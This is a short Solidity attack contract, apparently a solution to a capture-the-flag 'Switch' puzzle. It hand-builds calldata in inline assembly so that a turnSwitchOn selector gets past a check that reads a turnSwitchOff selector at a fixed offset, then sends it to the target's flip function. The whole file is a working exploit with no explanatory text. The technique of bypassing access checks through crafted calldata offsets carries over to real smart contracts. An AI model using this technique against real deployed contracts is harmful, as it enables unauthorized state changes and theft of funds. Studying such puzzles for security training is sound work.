pragma solidity ^0.8.0;

contract AttackSwitch {
    address private immutable switchInstance;

    constructor(address _instance) {
        switchInstance = _instance;
    }

    function attack() public {
        bytes4 turnOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes memory exploitData = new bytes(72);
        assembly {
            mstore(add(exploitData, 0x20), turnOnSelector)
            mstore(add(exploitData, add(0x20, 68)), offSelector)
        }
        (bool success, ) = switchInstance.call(abi.encodeWithSelector(0x5f93ba86, exploitData));
        require(success, "call failed");
    }
}